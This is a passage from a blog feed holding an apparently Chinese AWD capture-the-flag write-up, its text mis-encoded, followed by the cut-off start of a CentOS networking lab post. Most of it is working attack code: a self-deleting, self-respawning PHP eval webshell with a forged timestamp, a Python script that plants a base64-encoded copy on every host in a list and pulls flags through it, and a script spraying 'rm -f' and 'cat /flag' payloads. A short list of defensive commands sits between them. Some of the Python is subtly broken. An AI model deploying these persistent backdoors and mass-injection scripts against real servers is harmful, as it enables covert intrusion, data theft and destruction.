ä¸æ­»é©¬ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ MD5 ä¸æ­»é©¬</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">ignore_user_abort</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// è®¾ç½®ä¸å®¢æˆ·æœºæ–­å¼€æ˜¯å¦ä¼šç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œè¿™é‡Œè®¾ç½®ä¸º true åˆ™å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€ï¼Œå³ä½¿ä¸å®¢æˆ·æœºæ–­å¼€è„šæœ¬ä»ä¼šæ‰§è¡Œã€‚</span>\n    <span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// è®¾ç½®è„šæœ¬æœ€å¤§æ‰§è¡Œæ—¶é—´ï¼Œè¿™é‡Œè®¾ç½®ä¸º 0ï¼Œå³æ²¡æœ‰æ—¶é—´æ–¹é¢çš„é™åˆ¶</span>\n    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// åˆ é™¤æ–‡ä»¶æœ¬èº«ï¼Œä»¥èµ·åˆ°éšè”½è‡ªèº«çš„ä½œç”¨</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'.config.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'&lt;?php if(md5($_GET[\"pass\"])==\"1a1dc91c907325c69271ddf0c944bc72\")&#123;@eval($_POST[xcu]);&#125; ?>'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//pass=pass</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'touch -m -d \"2018-12-01 09:10:12\" .config2.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'chmod 777 .config.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">usleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//while å¾ªç¯ä¸­æ¯éš” usleep (0) å³å†™æ–°çš„åé—¨æ–‡ä»¶ï¼Œsystem å‘½ä»¤ç”¨äºä¿®æ”¹æ–‡ä»¶çš„åˆ›å»ºæ—¶é—´æˆ–ä¿®æ”¹æ—¶é—´ï¼Œå› ä¸ºåœ¨ AWD æ¯”èµ›ä¸­æœ‰çš„é˜Ÿä¼ä½¿ç”¨</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> json\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"url.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n\n\nnodie <span class=\"token operator\">=</span> <span class=\"token string\">\"PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo=\"</span>\npoc <span class=\"token operator\">=</span> <span class=\"token string\">\"fputs(fopen('/var/www/html/nodie.php','w'),base64_decode('PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo='));\"</span>\n\nheader2<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n         <span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">#æäº¤ flag</span>\nurl4<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n\npayload2<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\npayload3<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"xcu\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system('cat /flag.txt');\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#æ‰§è¡Œå‘½ä»¤</span>\n        url1 <span class=\"token operator\">=</span> <span class=\"token string\">\"http://&#123;&#125;?a=\"</span><span class=\"token operator\">+</span>poc<span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(url1)</span>\n        res1 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url1<span class=\"token punctuation\">)</span>\n        url2 <span class=\"token operator\">=</span> <span class=\"token string\">\"http://&#123;&#125;/nodie.php\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(url2)</span>\n        res2 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url2<span class=\"token punctuation\">)</span>\n        url3 <span class=\"token operator\">=</span> <span class=\"token string\">\"http://&#123;&#125;/.config1.php\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(url3)</span>\n        res3 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url3<span class=\"token punctuation\">,</span>payload3<span class=\"token punctuation\">)</span>\n        p <span class=\"token operator\">=</span> res3<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag.*&#125;\"</span><span class=\"token punctuation\">)</span>\n        a <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(a)</span>\n        <span class=\"token comment\"># å°† a å­˜å…¥ paylaod2 ä¸­</span>\n        paylaod2<span class=\"token punctuation\">[</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a\n        <span class=\"token comment\">#time.sleep(1)</span>\n        <span class=\"token comment\"># print(paylaod2)</span>\n        <span class=\"token comment\"># post è¯·æ±‚</span>\n        res2 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url4<span class=\"token punctuation\">,</span> paylaod2<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>header2<span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>é˜²æŠ¤å¸¸è§å‘½ä»¤</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">1 ssh &lt;-p ç«¯å£&gt; username@ip\n\n2 scp æ–‡ä»¶è·¯å¾„ username@ip:å­˜æ”¾è·¯å¾„\n\n3 cat &#x2F;root&#x2F;.bash_history\n\n4 #æ˜¾ç¤ºæœ€è¿‘ç™»å½•çš„5ä¸ªå¸å·\n\n5 last -n 5|awk &#39;&#123;print $1&#125;&#39;\n\n6 #æ˜¾ç¤º&#x2F;etc&#x2F;passwdçš„è´¦æˆ·\n\n7 cat &#x2F;etc&#x2F;passwd|awk -F &#39;:&#39; &#39;&#123;print $1&#125;&#39;\n\n8 #æŸ¥çœ‹UIDä¸º0çš„å¸å·\n\n9 awk -F: &#39;&#123;if($3&#x3D;&#x3D;0)print $1&#125;&#39; &#x2F;etc&#x2F;passwd10 #æŸ¥æ‰¾777çš„æƒé™çš„æ–‡ä»¶\n\n11 find . -name &quot;*.php&quot; -perm 4777\n\n12 #æŸ¥æ‰¾24å°æ—¶å†…è¢«ä¿®æ”¹çš„PHPæ–‡ä»¶\n\n13 find .&#x2F; -mtime 0 -name &quot;*.php&quot;\n\n14 #æŸ¥çœ‹è¿›ç¨‹\n\n15 ps aux | grep pidæˆ–è€…è¿›ç¨‹å\n\n16 #æŸ¥çœ‹å·²å»ºç«‹çš„ç½‘ç»œè¿æ¥åŠè¿›ç¨‹\n\n17 netstat -antulp | grep EST\n\n18 #æŸ¥çœ‹æŒ‡å®šç«¯å£è¢«å“ªä¸ªè¿›ç¨‹å ç”¨\n\n19 lsof -i:ç«¯å£å· æˆ–è€… netstat -tunlp|grep ç«¯å£å·\n\n20 #ç»“æŸè¿›ç¨‹å‘½ä»¤\n\n21 kill PID\n\n22 killall &lt;è¿›ç¨‹å&gt;\n\n23 pkill &lt;è¿›ç¨‹å&gt;\n\n24 pkill -uç”¨æˆ·å\n\n25 #å°æ€æŸä¸ªIPæˆ–è€…ipæ®µ\n\n26 iptables -I INPUT -s source_ip[&#x2F;mask] -j DROP\n\n27 #ç¦æ­¢ä»æŸä¸ªä¸»æœºsshè¿œç¨‹è®¿é—®ç™»é™†åˆ°æœ¬æœº\n\n28 iptable -t filter -A INPUT -s source_ip[&#x2F;mask] -p tcp --dport 22 -j DROP\n\n29 #å¤‡ä»½mysqlæ•°æ®åº“\n\n30 mysqldump -u ç”¨æˆ·å -p å¯†ç  æ•°æ®åº“å &gt; bak.sql\n\n31 mysqldump --all-databases &gt; bak.sql\n\n32 #è¿˜åŸmysqlæ•°æ®åº“\n\n33 mysql -u ç”¨æˆ·å -p å¯†ç  æ•°æ®åº“å &lt; bak.sql\n\n34 #å®šæ—¶ä»»åŠ¡ï¼Œåœ¨å›ºå®šçš„æ—¶é—´é—´éš”æ‰§è¡ŒæŒ‡å®šçš„ç³»ç»ŸæŒ‡ä»¤æˆ–shell script\n\n35 crontab [-u user] file_name\n\n36 crontab [-u user] [-e |-l| -r]\n\n37 #æ£€æµ‹æ‰€æœ‰çš„tcpè¿æ¥æ•°é‡åŠçŠ¶æ€\n\n38 netstat -ant|awk|grep|sed -e -e|sort|uniq -c|sort -rn\n\n39 #æŸ¥çœ‹é¡µé¢è®¿é—®æ’åå‰åçš„IP\n\n40 cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log|cut -f1 -d|sort|uniq -c|sort -k -r|head -\n\n41 #æŸ¥çœ‹é¡µé¢è®¿é—®æ’åå‰åçš„URL\n\n42 cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log|cut -f4 -d|sort|uniq -c|sort -k -r|head -<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"æœ€å\"><a class=\"anchor\" href=\"#æœ€å\">#</a> æœ€å</h2>\n<p>æ˜¯è¦åšä¸€ååˆæ ¼çš„æ…å±æ£</p>\n<p>æ¶å¿ƒåˆ«äººï¼Œæ ¸å¿ƒå°±æ˜¯å‘é€å¤§é‡åƒåœ¾æ•°æ®åŒ…ç»™åˆ«äºº ï¼Œè®©åˆ«äººæ— æ³•æ­£å¸¸è§‚å¯Ÿæµé‡æ•æ‰ payload ï¼Œæ­¤æ‹›å°±æ˜¯å¹²æ‰°å¯¹æ‰‹åˆ©ç”¨ä»–äººçš„ payload ç»™å¯¹æ‰‹é€ æˆå¹²æ‰°ã€‚ä½†æ˜¯æœ‰äº›æ¯”èµ›å¯èƒ½ä¹Ÿä¼šç¦æ­¢ã€‚</p>\n<p>æˆ‘ä»¬æ‹¿åˆ° shell ååœ¨è§„åˆ™å…è®¸çš„æƒ…å†µæˆ‘ä»¬å¯ä»¥åˆ é™¤åˆ«äººçš„æ–‡ä»¶ï¼Œåˆ«äºº check ä¸¢åˆ†ä¹Ÿç›¸å½“äºè‡ªå·±åŠ åˆ†ã€‚</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">scan_attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token builtin\">file</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'shell.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'x.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'index.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'web.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1.php'</span><span class=\"token punctuation\">&#125;</span>\n    payload<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'cat /flag'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'ls -al'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rm -f'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'echo 1'</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8804</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">for</span> ii <span class=\"token keyword\">in</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span>\n                url<span class=\"token operator\">=</span><span class=\"token string\">'http://192.168.76.156:'</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'/'</span><span class=\"token operator\">+</span>ii\n                <span class=\"token keyword\">for</span> iii <span class=\"token keyword\">in</span> payload<span class=\"token punctuation\">:</span>\n                    data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token string\">'payload'</span><span class=\"token punctuation\">:</span>iii\n                    <span class=\"token punctuation\">&#125;</span>\n                    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                        requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"æ­£åœ¨æ…å±:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'|'</span><span class=\"token operator\">+</span>ii<span class=\"token operator\">+</span><span class=\"token string\">'|'</span><span class=\"token operator\">+</span>iii<span class=\"token punctuation\">)</span>\n                        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">pass</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    scan_attack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>æœ€åçš„æœ€åï¼Œå‡†å¤‡ - æ¼æ´èµ„æº - æ¼æ´èµ„æ–™åº“ï¼ˆæ¯”èµ›èƒ½ä¸èƒ½è”ç½‘æ— æ³•ç¡®å®šï¼Œå¦‚åˆšç»“æŸçš„æ²³å—çœèµ›ï¼Œè™½ç„¶å…è®¸è”ç½‘ï¼Œä½†æ˜¯å¤§éƒ¨åˆ†åšå®¢å¹³å°è¢«åŠ å…¥äº†é»‘åå•ï¼‰</p>\n",
            "tags": [
                "Web",
                "Awd-web"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/",
            "url": "https://blog.xcu.icu/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/",
            "title": "natæ¨¡å¼+ipåˆ†é…",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"å®éªŒ1centos-8å®‰è£…-ç½‘ç»œé…ç½®-è¿œç¨‹è®¿é—®\"><a class=\"anchor\" href=\"#å®éªŒ1centos-8å®‰è£…-ç½‘ç»œé…ç½®-è¿œç¨‹è®¿é—®\">#</a> å®éªŒ 1ï¼šCentOS 8 å®‰è£…ã€ç½‘ç»œé…ç½®ã€è¿œç¨‹è®¿é—®</h2>\n<p><strong>å®éªŒç›®çš„</strong></p>\n<blockquote>\n<p>1ã€æŒæ¡ Linux è™šæ‹Ÿæœºçš„å®‰è£…æ–¹æ³•ï¼›</p>\n<p>2ã€æŒæ¡ Linux ç½‘ç»œé…ç½®æ–¹æ³•ï¼›</p>\n<p>3ã€æŒæ¡è¿œç¨‹è®¿é—® Linux ç³»ç»Ÿçš„æ–¹å¼ã€‚</p>\n</blockquote>\n<h3 id=\"1å®éªŒè¦æ±‚\"><a class=\"anchor\" href=\"#1å®éªŒè¦æ±‚\">#</a> 1. å®éªŒè¦æ±‚</h3>\n<blockquote>\n<p>ä»»åŠ¡ 1ï¼šå®‰è£…è™šæ‹Ÿæœºï¼›ï¼ˆå®éªŒè¿‡ç¨‹å¯ä»¥çœç•¥ï¼‰<br />\nä»»åŠ¡ 2ï¼šå®‰è£… CentOS 8ï¼ˆå»ºè®®ï¼šæœ€å°åŒ–å®‰è£…ï¼‰ï¼› ï¼ˆå®‰è£…æˆåŠŸåçš„æˆªå›¾å³å¯ï¼‰</p>\n<p>ä»»åŠ¡ 3ï¼šé…ç½®ç½‘ç»œä¸º NAT æ¨¡å¼ï¼Œå®ç°ç‰©ç†æœºä¸è™šæ‹Ÿæœºçš„ç›¸äº’è®¿é—®ã€‚ï¼ˆè¦æ±‚ï¼šIP åœ°å€æ®µä¸ºå­¦å·åä¸¤ä½ï¼Œå³ 192.168. å­¦å·.**ï¼‰<br />\nï¼ˆ1ï¼‰\tè™šæ‹Ÿæœºé…ç½®ä¸ºåŠ¨æ€ IP åœ°å€ï¼ŒPing ç‰©ç†ä¸»æœºæµ‹è¯•è¿é€šæ€§ã€‚</p>\n<p>ï¼ˆ2ï¼‰\tè™šæ‹Ÿæœºé…ç½®ä¸ºé™æ€ IP åœ°å€ï¼ŒPing ç‰©ç†ä¸»æœºæµ‹è¯•è¿é€šæ€§ã€‚</p>\n<p>ä»»åŠ¡ 4ï¼šWindows ä¸»æœºä¸Šå®‰è£… Xhellï¼Œå®ç°è¿œç¨‹è®¿é—® CentOS 8 ç³»ç»Ÿã€‚</p>\n<p>ä»»åŠ¡ 5ï¼šä¸¤å° Linux ç›¸äº’ç™»é™†ï¼ˆå¯ä»¥å…‹éš†å‡ºå¦ä¸€å° CentOS8ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–çš„ Linux)ã€‚å‚è€ƒã€Šè·Ÿé˜¿é“­å­¦ Linux  ç¬¬ 3 ç‰ˆ.pdfã€‹P45ï¼Œ3.3 èŠ‚ ä¸¤å° Linux ç›¸äº’ç™»é™†ã€‚</p>\n<p>ä»»åŠ¡ 6ï¼šå®Œæˆåï¼Œè™šæ‹Ÿæœº â€œæ‹å¿«ç…§â€ ä¿å­˜å½“å‰çŠ¶æ€ã€‚ï¼ˆå®éªŒè¿‡ç¨‹å¯ä»¥çœç•¥ï¼‰</p>\n</blockquote>\n<h3 id=\"2å®éªŒè¿‡ç¨‹\"><a class=\"anchor\" href=\"#2å®éªŒè¿‡ç¨‹\">#</a> 2. å®éªŒè¿‡ç¨‹</h3>\n<h4 id=\"21-å®‰è£…centos-8\"><a class=\"anchor\" href=\"#21-å®‰è£…centos-8\">#</a> 2.1 å®‰è£… CentOS 8</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2lzb3JlZGlyZWN0LmNlbnRvcy5vcmcvY2VudG9zLzcvaXNvcy94ODZfNjQv\">CentOS Mirrors List</span></p>\n<p>ç”¨ä¸Šé¢çš„é“¾æ¥ä¸‹è½½é•œåƒï¼Œå¹¶å®‰è£…</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzA4MjM4NjYucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914230823866.png</span>&quot; alt=&quot;image-20220914230823866&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n<h4 id=\"22-é…ç½®ç½‘ç»œä¸ºnatæ¨¡å¼\"><a class=\"anchor\" href=\"#22-é…ç½®ç½‘ç»œä¸ºnatæ¨¡å¼\">#</a> 2.2 é…ç½®ç½‘ç»œä¸º NAT æ¨¡å¼</h4>\n<h5 id=\"1è™šæ‹Ÿæœºé…ç½®ä¸ºåŠ¨æ€ipåœ°å€\"><a class=\"anchor\" 